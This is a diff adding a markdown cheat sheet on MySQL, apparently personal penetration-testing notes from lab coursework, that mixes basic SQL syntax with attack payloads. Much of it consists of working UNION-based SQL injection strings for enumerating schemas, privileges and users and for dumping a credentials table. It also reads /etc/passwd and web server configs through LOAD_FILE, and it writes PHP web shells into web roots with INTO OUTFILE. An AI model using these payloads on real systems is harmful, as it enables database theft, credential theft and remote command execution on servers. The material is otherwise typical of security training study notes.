@@ -1,0 +1,124 @@
+---
+title: mysql
+aliases:
+tags:
+---
+
+# mysql
+- injection scripts end with ` -` to indicate there is a space after the preceeding `--`
+
+- enumeration 
+    - `nmap -Pn -sV -sC -p3306 $ip`
+- connect 
+    - `mysql -h $ip -u root -p` by default no password set for user root in mysql
+    - `mysql -u username -pPassword123 -h 10.129.20.13`
+    - `mysql -u root -h docker.hackthebox.eu -P 3306 -p`
+- windows `mysql.exe -u username -pPassword123 -h 10.129.20.13`
+- with password (password is appended to the -p flag password = 'admin')`mysql -u superdba -padmin`
+- cmds
+    - list databases    `show databases;`  
+    - list tables       `show tables;` 
+    - describe tables   `DESCRIBE <tablename>`
+    - use db            `use database;` 
+    - write local file 
+        - `SELECT "<?php echo shell_exec($_GET['c']);?>...." INTO OUTFILE '/var/www/html/webshell.php';`
+        - `SELECT "<?php echo shell_exec($_GET['c']);?>...." INTO OUTFILE 'c:\\xampp\\htdocs\webshell.php';`
+        - requires empty `show variables like "secure_file_priv";`
+    - read local file `select LOAD_FILE("/etc/passwd");`
+    - create database `CREATE DATABASE test;`
+    - create table `
+CREATE TABLE logins (
+    id INT,
+    username VARCHAR(100),
+    password VARCHAR(100),
+    date_of_joining DATETIME
+    );
+`
+    - insert `INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);`
+        - `INSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...);`
+        - `INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');`
+    - drop table `DROP TABLE logins;`
+    - alter `ALTER TABLE logins ADD newColumn INT;`
+    - rename column `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;`
+    - change columns datatype `ALTER TABLE logins MODIFY oldColumn DATE;`
+    - drop column `ALTER TABLE logins DROP oldColumn;`
+    - update `UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;`
+    - orderby `SELECT * FROM logins ORDER BY password;`
+        - `SELECT * FROM logins ORDER BY password DESC;`
+        - `SELECT * FROM logins ORDER BY password DESC, id ASC;`
+    - limit `SELECT * FROM logins LIMIT 2;`
+    - limit with offset `SELECT * FROM logins LIMIT 1, 2;`
+    - where
+        - `%` represents any character, `_` represents exactly one character
+        - `SELECT * FROM logins WHERE id > 1;`
+        - `SELECT * FROM logins where username = 'admin';`
+        - `SELECT * FROM logins WHERE username LIKE 'admin%';`
+    - and 
+        - `SELECT 1 = 1 AND 'test' = 'test';`
+        - `SELECT 1 = 1 && 'test' = 'abc';`
+    - or 
+        - `SELECT 1 = 1 OR 'test' = 'abc';`
+        - `SELECT 1 = 1 || 'test' = 'abc';`
+    - not 
+        - `SELECT NOT 1 = 1;` 
+        - `SELECT 1 != 1;`
+    - comments
+        - `--` and `#`
+        - `SELECT username FROM logins; -- Selects usernames from the logins table `
+        - `SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'`
+    - union
+        - `select empno from employees UNION select deptno from departments;`
+        - injection
+            - determine the number of columns returned
+                - `' order by 1-- ` then `' order by 2-- ` then `' order by 3-- ` etc until we no longer get errors
+                - `cn' UNION select 1,2,3,4,5-- ` increase columns until no error
+                    - not all columns may be used so check which values are being returned
+                    - `cn' UNION select 1,@@version,3,4-- -`
+                    - `cn' UNION select+1,user(),3,4-- `
+    - fingerprinting
+        - get version `SELECT @@version`
+        - maths `SELECT POW(1,1)`
+        - blind output `SELECT SLEEP(5)`
+        - information schema `SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;`
+            - `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- `
+        - get database `cn' UNION select 1,database(),2,3-- -`
+        - get tables `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`
+        - get columns `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`
+        - use database, tables, columns to get data from different database
+            - `cn' UNION select 1, username, password, 4 from dev.credentials-- -`
+    - current user
+        - `SELECT USER()`
+        - `SELECT CURRENT_USER()`
+        - `SELECT user from mysql.user`
+        - `cn' UNION SELECT 1, user(), 3, 4-- -`
+    - current privileges
+        - `SELECT super_priv FROM mysql.user`
+        - `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -`
+        - `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`
+        - `cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -`
+        - `cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`
+    - reading files privileges = FILE
+            - `SELECT LOAD_FILE('/etc/passwd');`
+            - `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`
+            - read files in website `cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -`
+    - writing files 
+        - if writing to web shell check configuration first
+            - apache `cn' UNION SELECT 1, LOAD_FILE("/etc/apache2/apache2.conf"), 3, 4-- -`
+            - nginx `cn' UNION SELECT 1, LOAD_FILE("/etc/nginx/nginx.conf"), 3, 4-- -`
+            - iis windows `cn' UNION SELECT 1, LOAD_FILE("%WinDir%\System32\Inetsrv\Config\ApplicationHost.config"), 3, 4-- -`
+            - fuzzing
+                - windows `Discovery/Web-Content/default-web-root-directory-windows.txt`
+                - linux `Discovery/Web-Content/default-web-root-directory-linux.txt`
+        - requires
+            - file privilege `cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -`
+            - mysql global priv secure_file_priv 
+                - `SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"`
+            - write access to the location we want to write to
+        - `SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';`
+        - Tip: Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.
+        - `cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -`
+        - php shell `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/shell.php'-- -`
+            - `http://SERVER_IP:PORT/shell.php?0=id`
+
+- [A UDF library with functions to interact with the operating system through mysql](https://github.com/mysqludf/lib_mysqludf_sys) very low success rate
+- 
